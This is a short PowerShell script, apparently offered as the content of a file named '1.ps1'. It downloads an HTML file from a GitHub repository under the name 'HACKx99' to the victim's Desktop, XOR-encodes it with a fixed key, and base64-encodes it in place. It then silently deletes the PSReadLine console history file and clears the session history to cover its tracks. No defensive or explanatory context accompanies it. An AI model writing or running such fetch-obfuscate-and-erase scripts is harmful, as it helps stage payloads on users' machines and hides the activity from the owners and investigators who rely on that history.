# Content of 1.ps1 should be:
$url="https://raw.githubusercontent.com/HACKx99/WebSite/main/1.html"
$desktopPath=[Environment]::GetFolderPath("Desktop")
$outputPath=Join-Path $desktopPath "1.html"
irm $url -OutFile $outputPath
if(Test-Path $outputPath){
    $content=gc $outputPath -Raw
    $key="key123"
    $eb=@()
    $kb=[System.Text.Encoding]::UTF8.GetBytes($key)
    for($i=0;$i -lt $content.Length;$i++){
        $tb=[byte]$content[$i]
        $kbx=$kb[$i%$kb.Length]
        $eb+=$tb -bxor $kbx
    }
    $ec=[System.Convert]::ToBase64String($eb)
    $ec|sc $outputPath
}
ri "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
Clear-History
